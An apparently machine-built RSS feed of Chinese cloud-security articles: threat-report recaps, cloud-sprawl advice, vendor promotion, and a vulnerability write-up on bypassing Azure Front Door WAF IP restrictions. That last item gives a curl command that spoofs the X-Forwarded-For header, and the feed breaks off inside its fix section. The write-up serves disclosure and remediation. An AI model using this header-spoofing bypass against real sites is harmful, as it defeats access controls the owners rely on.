<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>云安全 on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/%E4%BA%91%E5%AE%89%E5%85%A8/</link>
        <description>Recent content in 云安全 on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Thu, 07 Aug 2025 08:00:18 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E4%BA%91%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>高级威胁攻击者开启网络安全新纪元：CrowdStrike 2025威胁狩猎报告解析</title>
        <link>http://localhost:1313/p/%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E6%94%BB%E5%87%BB%E8%80%85%E5%BC%80%E5%90%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%96%B0%E7%BA%AA%E5%85%83crowdstrike-2025%E5%A8%81%E8%83%81%E7%8B%A9%E7%8C%8E%E6%8A%A5%E5%91%8A%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Thu, 07 Aug 2025 08:00:18 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E6%94%BB%E5%87%BB%E8%80%85%E5%BC%80%E5%90%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%96%B0%E7%BA%AA%E5%85%83crowdstrike-2025%E5%A8%81%E8%83%81%E7%8B%A9%E7%8C%8E%E6%8A%A5%E5%91%8A%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;p&gt;CISOs及其团队正在进入网络威胁的&amp;quot;新时代&amp;quot;，网络安全巨头CrowdStrike研究人员在《2025威胁狩猎报告》中指出，如今的威胁攻击者展现出&amp;quot;商业级效率&amp;quot;的精密运作特征。&amp;ldquo;这些对手以战略精度操作以最大化影响并快速达成目标，&amp;ldquo;报告强调，&amp;ldquo;创新是智胜这些进取型对手的关键基石。&amp;rdquo;&lt;/p&gt;
&lt;h3 id=&#34;ai驱动的攻击升级&#34;&gt;AI驱动的攻击升级
&lt;/h3&gt;&lt;p&gt;威胁战术中最突出的趋势是AI技术的快速采用。&amp;ldquo;高级对手使用生成式AI提升攻击复杂度、加快行动速度并增强能力，&amp;ldquo;CrowdStrike高级副总裁Adam Meyers在简报会上表示。攻击者正利用生成式AI制作更逼真的钓鱼内容、商业邮件诈骗话术，甚至伪造身份信息。&lt;/p&gt;
&lt;p&gt;防御这类高效攻击者的挑战在于，他们高度依赖通过社交工程（现常由AI辅助）利用难以控制的人为因素，并瞄准IT管辖范围外的非托管设备以规避检测。&lt;/p&gt;
&lt;h3 id=&#34;五大威胁集群深度剖析&#34;&gt;五大威胁集群深度剖析
&lt;/h3&gt;&lt;p&gt;报告通过典型案例将威胁集群划分为五大作战领域：&lt;/p&gt;
&lt;h4 id=&#34;跨域攻击blockade-spider与operator-panda&#34;&gt;跨域攻击：Blockade Spider与Operator Panda
&lt;/h4&gt;&lt;p&gt;这类攻击者通过身份系统、终端设备、云环境等多领域分散行动逃避检测。2025年初观察到的Blockade Spider通过非托管VPN接入网络，试图删除备份文件并干扰CrowdStrike的Falcon传感器。而中国背景的Operator Panda（又称Salt Typhoon）则通过漏洞链攻击思科交换机，并清除日志掩盖行踪。&lt;/p&gt;
&lt;h4 id=&#34;身份威胁scattered-spider&#34;&gt;身份威胁：Scattered Spider
&lt;/h4&gt;&lt;p&gt;该组织专精社交工程攻击，2025年4月复出后，其勒索攻击从初始访问到加密仅需24小时，较2024年的35.5小时大幅提速。语音钓鱼（vishing）是其标志性手段，去年使用量激增443%。&lt;/p&gt;
&lt;h4 id=&#34;云环境威胁genesis-panda与murky-panda&#34;&gt;云环境威胁：Genesis Panda与Murky Panda
&lt;/h4&gt;&lt;p&gt;过去12个月与中国关联的云入侵事件增长40%。Genesis Panda利用云服务支持工具部署和C2通信，曾通过入侵Jenkins服务器获取云凭证。Murky Panda则通过合作伙伴关系渗透北美企业的Entra ID租户。&lt;/p&gt;
&lt;h4 id=&#34;终端威胁glacial-panda&#34;&gt;终端威胁：Glacial Panda
&lt;/h4&gt;&lt;p&gt;这个与中国关联的组织专门针对电信行业Linux系统（包括传统系统），部署特制OpenSSH工具实施ShieldSlide技术，通过记录认证事件实现横向移动。&lt;/p&gt;
&lt;h4 id=&#34;漏洞威胁graceful-spider&#34;&gt;漏洞威胁：Graceful Spider
&lt;/h4&gt;&lt;p&gt;2024年观察到的漏洞中52%与初始访问相关。该犯罪组织在2024年底利用Cleo数据传输产品的零日文件上传漏洞，实现跨地域多行业的远程代码执行。&lt;/p&gt;
&lt;h3 id=&#34;关键防御建议&#34;&gt;关键防御建议
&lt;/h3&gt;&lt;p&gt;Meyers为防御者提出六项核心策略：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;实施身份威胁检测&lt;/strong&gt;：部署身份威胁检测响应(ITDR)系统&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;强制多因素认证&lt;/strong&gt;：避免使用SMS等弱认证方式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;强化云安全防护&lt;/strong&gt;：弥补云环境安全短板&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;消除跨域盲点&lt;/strong&gt;：通过EDR和下一代SIEM覆盖非托管设备&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;调整补丁优先级&lt;/strong&gt;：优先修补已知被利用漏洞（参考CISA每周清单）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;深入了解对手&lt;/strong&gt;：研究威胁组织战术变化趋势&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;报告特别强调，勒索软件团伙现在平均在入侵后24小时内就会实施加密，较2023年的80小时大幅提升，这要求企业必须建立更快速的威胁响应机制。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>什么是云蔓延？云资源失控扩张的风险与应对策略</title>
        <link>http://localhost:1313/p/%E4%BB%80%E4%B9%88%E6%98%AF%E4%BA%91%E8%94%93%E5%BB%B6%E4%BA%91%E8%B5%84%E6%BA%90%E5%A4%B1%E6%8E%A7%E6%89%A9%E5%BC%A0%E7%9A%84%E9%A3%8E%E9%99%A9%E4%B8%8E%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/</link>
        <pubDate>Thu, 07 Aug 2025 03:14:20 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BB%80%E4%B9%88%E6%98%AF%E4%BA%91%E8%94%93%E5%BB%B6%E4%BA%91%E8%B5%84%E6%BA%90%E5%A4%B1%E6%8E%A7%E6%89%A9%E5%BC%A0%E7%9A%84%E9%A3%8E%E9%99%A9%E4%B8%8E%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5/</guid>
        <description>&lt;h1 id=&#34;什么是云蔓延&#34;&gt;什么是云蔓延？
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;云蔓延&lt;/strong&gt;指企业云实例、服务或供应商的失控性扩散，通常源于组织对云计算资源缺乏可见性或管控能力。该现象影响所有云服务类型，在软件即服务（SaaS）和基础设施即服务（IaaS）模式中尤为常见。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;SaaS场景&lt;/strong&gt;：团队可绕过审批直接部署应用，形成工具拼凑现象&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IaaS场景&lt;/strong&gt;：虚拟资源快速配置导致闲置或管理混乱的基础架构&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;成因分析&#34;&gt;成因分析
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;缺乏集中管理&lt;/strong&gt;&lt;br&gt;
各部门独立采用不同云服务（如开发团队使用AWS，研发组选用Google Cloud），跨云平台API不兼容会引发数据一致性问题。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;监控不足&lt;/strong&gt;&lt;br&gt;
未及时关闭测试环境（如开发者遗忘停用AWS工作负载），持续产生闲置资源费用。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;影子IT&lt;/strong&gt;&lt;br&gt;
员工未经IT批准使用个人云存储（如Google Drive），导致账户碎片化与合规风险。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;标签规范缺失&lt;/strong&gt;&lt;br&gt;
资源命名混乱造成重复部署和追踪困难。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;主要类型&#34;&gt;主要类型
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;类型&lt;/th&gt;
          &lt;th&gt;特征&lt;/th&gt;
          &lt;th&gt;案例&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;平台蔓延&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;多云平台无序使用&lt;/td&gt;
          &lt;td&gt;AWS/Azure/Google Cloud混用&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;数据蔓延&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;数据分散存储&lt;/td&gt;
          &lt;td&gt;冗余数据增加安全暴露面&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;身份蔓延&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;账号权限泛滥&lt;/td&gt;
          &lt;td&gt;服务账号未定期审计&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;风险影响&#34;&gt;风险影响
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;成本激增&lt;/strong&gt;：闲置实例持续计费&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;安全弱化&lt;/strong&gt;：过期实例成为攻击跳板&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;合规失效&lt;/strong&gt;：难以满足GDPR/HIPAA要求&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;防控措施&#34;&gt;防控措施
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;建立云治理中心&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;制定跨部门资源分配策略&lt;/li&gt;
&lt;li&gt;使用CloudHealth等成本管理工具&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;实施自动化管控&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;设置非工作时间自动关闭规则&lt;/li&gt;
&lt;li&gt;限制管理员权限范围&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;强化标签体系&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;采用统一资源分类标准&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;关键洞察&lt;/strong&gt;：云服务商CISO调查显示，83%的企业因身份蔓延导致过权限滥用事件。通过集中式IAM（身份访问管理）可降低此类风险65%。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;企业应定期执行云资源清单审计，结合FinOps（云财务运营）框架优化支出，避免&amp;quot;云账单休克&amp;quot;现象。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Keycloak Kubernetes实战工作坊：从零到精通云应用安全</title>
        <link>http://localhost:1313/p/keycloak-kubernetes%E5%AE%9E%E6%88%98%E5%B7%A5%E4%BD%9C%E5%9D%8A%E4%BB%8E%E9%9B%B6%E5%88%B0%E7%B2%BE%E9%80%9A%E4%BA%91%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/</link>
        <pubDate>Wed, 06 Aug 2025 05:23:35 +0800</pubDate>
        
        <guid>http://localhost:1313/p/keycloak-kubernetes%E5%AE%9E%E6%88%98%E5%B7%A5%E4%BD%9C%E5%9D%8A%E4%BB%8E%E9%9B%B6%E5%88%B0%E7%B2%BE%E9%80%9A%E4%BA%91%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/</guid>
        <description>&lt;h1 id=&#34;keycloak-kubernetes实战工作坊&#34;&gt;Keycloak Kubernetes实战工作坊
&lt;/h1&gt;&lt;p&gt;面向需要在云环境中保护应用程序和服务安全的人员。学习如何：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将应用与Github等社交登录系统连接&lt;/li&gt;
&lt;li&gt;创建登录流程（如验证、注册等）&lt;/li&gt;
&lt;li&gt;配置OTP双因素认证&lt;/li&gt;
&lt;li&gt;处理认证事件&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这是一个&amp;quot;从零到精通&amp;quot;的完全动手实践工作坊，基于Keycloak首席开发者Stian Thorgensen的经典Demo构建。&lt;/p&gt;
&lt;h2 id=&#34;技术栈&#34;&gt;技术栈
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Keycloak&lt;/strong&gt;：开源身份和访问管理解决方案&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Kubernetes&lt;/strong&gt;：容器编排平台&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;OAuth/OIDC&lt;/strong&gt;：开放授权协议&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;社交登录集成&lt;/strong&gt;：支持Github等第三方认证&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;工作坊特色&#34;&gt;工作坊特色
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;生产级Keycloak集群部署&lt;/li&gt;
&lt;li&gt;自定义领域配置实战&lt;/li&gt;
&lt;li&gt;客户端凭证流实现&lt;/li&gt;
&lt;li&gt;安全策略调优&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;本教程源自Keycloak官方核心Demo，经过Kubernetes环境适配和功能扩展，适用于现代云原生应用场景。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>新风险指数助力企业应对云安全混沌局面</title>
        <link>http://localhost:1313/p/%E6%96%B0%E9%A3%8E%E9%99%A9%E6%8C%87%E6%95%B0%E5%8A%A9%E5%8A%9B%E4%BC%81%E4%B8%9A%E5%BA%94%E5%AF%B9%E4%BA%91%E5%AE%89%E5%85%A8%E6%B7%B7%E6%B2%8C%E5%B1%80%E9%9D%A2/</link>
        <pubDate>Tue, 05 Aug 2025 12:35:03 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%96%B0%E9%A3%8E%E9%99%A9%E6%8C%87%E6%95%B0%E5%8A%A9%E5%8A%9B%E4%BC%81%E4%B8%9A%E5%BA%94%E5%AF%B9%E4%BA%91%E5%AE%89%E5%85%A8%E6%B7%B7%E6%B2%8C%E5%B1%80%E9%9D%A2/</guid>
        <description>&lt;h3 id=&#34;新风险指数助力企业应对云安全混沌局面&#34;&gt;新风险指数助力企业应对云安全混沌局面
&lt;/h3&gt;&lt;p&gt;企业可利用IaC风险指数识别基础设施即代码环境中未受管理或治理的脆弱云资源。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;来源：Andriy Popov via Alamy Stock Photo&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;企业在维护整体安全态势时需要应对大量安全准则。新推出的IaC风险指数旨在帮助企业管理基础设施即代码环境相关的安全风险。&lt;/p&gt;
&lt;p&gt;IaC为企业提供了自动化部署和维护基础设施的方式。安全与IT团队可通过工具管理云资源、提升系统性能，并改善IT环境安全性。但若管理不当，IaC可能引发配置错误和意外数据暴露等风险，攻击者会伺机利用这些漏洞。&lt;/p&gt;
&lt;p&gt;云基础设施自动化初创公司ControlMonkey推出的IaC风险指数，通过安全仪表盘形式呈现颜色编码的风险等级（从低到严重），帮助企业识别环境中未管理、漂移或缺乏治理的脆弱资源。&lt;/p&gt;
&lt;h4 id=&#34;iac覆盖率即安全度量标准&#34;&gt;&amp;ldquo;IaC覆盖率即安全度量标准&amp;rdquo;
&lt;/h4&gt;&lt;p&gt;ControlMonkey CEO兼联合创始人Aharon Twizer表示，该指数核心目标是&amp;quot;在基础设施创建的源头测量并降低云风险&amp;quot;。它充当基础设施团队与安全团队之间的桥梁，促进协作。&lt;/p&gt;
&lt;p&gt;Twizer指出：&amp;ldquo;绕过IaC管道创建的云资源会规避企业依赖的所有控制措施（如验证、策略和可视化），这正是风险所在。此前无人对此进行量化。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;该指数包含两大核心数据点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;未管理的IaC资源（其风险程度是常规漏洞的两倍）&lt;/li&gt;
&lt;li&gt;企业普遍高估IaC覆盖率30%-40%，CISO们也常低估安全风险&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;ldquo;多数仪表盘聚焦部署后的检测，而本产品关注交付过程和基础设施构建方式——这正是治理成败的关键。&amp;ldquo;Twizer强调。&lt;/p&gt;
&lt;h4 id=&#34;企业面临的复杂云挑战&#34;&gt;企业面临的复杂云挑战
&lt;/h4&gt;&lt;p&gt;Twizer表示该指数适用于所有存在云复杂性的组织。混合云环境下管理资源本就困难，IaC风险指数提供了可操作的框架来识别覆盖盲区。&lt;/p&gt;
&lt;p&gt;&amp;ldquo;不仅要修补问题，更要将其纳入IaC治理，从源代码层面修复。&amp;ldquo;Twizer说，&amp;ldquo;关键不在于消除所有漏洞，而在于明年能否减少漏洞数量，这需要前瞻性地构建安全云策略。&amp;rdquo;&lt;/p&gt;
&lt;h4 id=&#34;优先修复关键威胁&#34;&gt;优先修复关键威胁
&lt;/h4&gt;&lt;p&gt;Enterprise Strategy Group应用现代化首席分析师Volk Torsten认为，此类指数可帮助企业优先构建关键事件的自动化修复流程。例如：存在网络分段缺陷的对外应用，其风险远高于内部自动化脚本。&lt;/p&gt;
&lt;p&gt;&amp;ldquo;在动态混合云环境中，能区分公开S3桶存放的是员工度假照片还是机密财务报表，这种能力极具价值。&amp;ldquo;Torsten指出。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;作者：Arielle Waldman&lt;/strong&gt;&lt;br&gt;
Dark Reading特约撰稿人，常驻波士顿的网络安全领域资深记者。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>AWS迁移安全指南：实现清晰度与信心的全面策略</title>
        <link>http://localhost:1313/p/aws%E8%BF%81%E7%A7%BB%E5%AE%89%E5%85%A8%E6%8C%87%E5%8D%97%E5%AE%9E%E7%8E%B0%E6%B8%85%E6%99%B0%E5%BA%A6%E4%B8%8E%E4%BF%A1%E5%BF%83%E7%9A%84%E5%85%A8%E9%9D%A2%E7%AD%96%E7%95%A5/</link>
        <pubDate>Tue, 05 Aug 2025 01:38:18 +0800</pubDate>
        
        <guid>http://localhost:1313/p/aws%E8%BF%81%E7%A7%BB%E5%AE%89%E5%85%A8%E6%8C%87%E5%8D%97%E5%AE%9E%E7%8E%B0%E6%B8%85%E6%99%B0%E5%BA%A6%E4%B8%8E%E4%BF%A1%E5%BF%83%E7%9A%84%E5%85%A8%E9%9D%A2%E7%AD%96%E7%95%A5/</guid>
        <description>&lt;h1 id=&#34;导航aws迁移实现清晰度与信心&#34;&gt;导航AWS迁移：实现清晰度与信心
&lt;/h1&gt;&lt;p&gt;将工作负载迁移到亚马逊云服务（AWS）代表着重要的战略机遇，能够提升敏捷性、可扩展性和创新潜力。但若缺乏全面的可见性与安全策略，此过程可能引入不可预见的风险、操作延迟以及管理新云环境的挑战。其中常被忽视的关键环节是敏感数据在迁移至云端及存储期间的发现与保护。&lt;/p&gt;
&lt;h2 id=&#34;迁移生命周期中的安全集成&#34;&gt;迁移生命周期中的安全集成
&lt;/h2&gt;&lt;p&gt;成功的迁移绝非将安全视为事后考虑。安全必须贯穿整个迁移生命周期：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;评估阶段&lt;/strong&gt;：盘点现有资产并识别风险&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;准备阶段&lt;/strong&gt;：建立安全的AWS着陆区&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;迁移与现代化阶段&lt;/strong&gt;：转移工作负载并优化云配置&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Rapid7安全平台通过统一关键能力提供支持：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Surface Command&lt;/strong&gt;：实现全面的攻击面管理&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Exposure Command&lt;/strong&gt;：集成CNAPP能力，持续监控云配置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;InsightConnect&lt;/strong&gt;：通过SOAR自动化修复流程&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;风险管理的三个阶段策略&#34;&gt;风险管理的三个阶段策略
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;迁移前&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;发现未知资产避免迁移隐患系统&lt;/li&gt;
&lt;li&gt;基于威胁情报的风险评分优先修复漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;迁移中&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;实施最小权限访问模型&lt;/li&gt;
&lt;li&gt;集成Amazon Macie实现敏感数据定位&lt;/li&gt;
&lt;li&gt;通过攻击路径分析评估业务影响&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;迁移后&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在CI/CD管道中实施&amp;quot;左移&amp;quot;安全&lt;/li&gt;
&lt;li&gt;扫描容器镜像和IaC模板&lt;/li&gt;
&lt;li&gt;持续监控生产环境配置漂移&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;通过自动化建立信心&#34;&gt;通过自动化建立信心
&lt;/h2&gt;&lt;p&gt;关键优势包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;利用Executive Risk View仪表板转化技术风险为商业洞察&lt;/li&gt;
&lt;li&gt;自动响应新AWS环境中的威胁&lt;/li&gt;
&lt;li&gt;通过基础设施即代码验证确保架构安全&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;通过将安全深度集成到迁移流程的每个阶段，组织能够以运营就绪状态替代不确定性。&amp;rdquo; —— Rapid7云安全专家&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.rapid7.com/products/surface-command/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;立即开始您的Surface Command免费试用&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Azure Front Door WAF IP限制绕过漏洞分析</title>
        <link>http://localhost:1313/p/azure-front-door-waf-ip%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
        <pubDate>Tue, 05 Aug 2025 00:59:01 +0800</pubDate>
        
        <guid>http://localhost:1313/p/azure-front-door-waf-ip%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;azures-front-door-waf-wtf-ip限制绕过&#34;&gt;Azure&amp;rsquo;s Front Door WAF WTF: IP限制绕过
&lt;/h1&gt;&lt;h2 id=&#34;背景&#34;&gt;背景
&lt;/h2&gt;&lt;p&gt;Azure提供两种WAF服务：全局部署的Front Door WAF和区域部署的Application Gateway WAF。本文披露的漏洞存在于Front Door WAF的IP限制功能中。&lt;/p&gt;
&lt;p&gt;当管理员配置IP限制规则时，默认匹配变量为&amp;quot;RemoteAddr&amp;quot;，该变量会优先检查X-Forwarded-For HTTP头而非真实客户端IP。而另一个选项&amp;quot;SocketAddr&amp;quot;才真正验证连接IP地址。&lt;/p&gt;
&lt;h2 id=&#34;漏洞验证&#34;&gt;漏洞验证
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;测试环境搭建&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;部署测试站点并配置Front Door WAF&lt;/li&gt;
&lt;li&gt;创建自定义规则：仅允许IP 123.45.67.89访问（使用RemoteAddr变量）&lt;/li&gt;
&lt;li&gt;启用WAF防护模式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;绕过验证&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;X-Forwarded-For: 123.45.67.89&amp;#34;&lt;/span&gt; https://victim.site
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;添加恶意X-Forwarded-For头即可绕过IP限制&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;变量差异&lt;/strong&gt;：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;服务&lt;/th&gt;
          &lt;th&gt;变量名&lt;/th&gt;
          &lt;th&gt;行为&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Front Door WAF&lt;/td&gt;
          &lt;td&gt;RemoteAddr&lt;/td&gt;
          &lt;td&gt;信任X-Forwarded-For头&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Front Door WAF&lt;/td&gt;
          &lt;td&gt;SocketAddr&lt;/td&gt;
          &lt;td&gt;验证真实连接IP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;App Gateway WAF&lt;/td&gt;
          &lt;td&gt;RemoteAddr&lt;/td&gt;
          &lt;td&gt;验证真实连接IP&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;攻击影响&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用Burp Intruder可在40分钟内暴力破解/16网段&lt;/li&gt;
&lt;li&gt;匹配自定义规则后会跳过所有OWASP防护检测&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;检测与修复&#34;&gt;检测与修复
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;检测脚本&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;./&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;azure_frontdoor_waf_wtf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;修复方案&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将规则变量改为SocketAddr&lt;/li&gt;
&lt;li&gt;如需代理支持，应组合规则：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
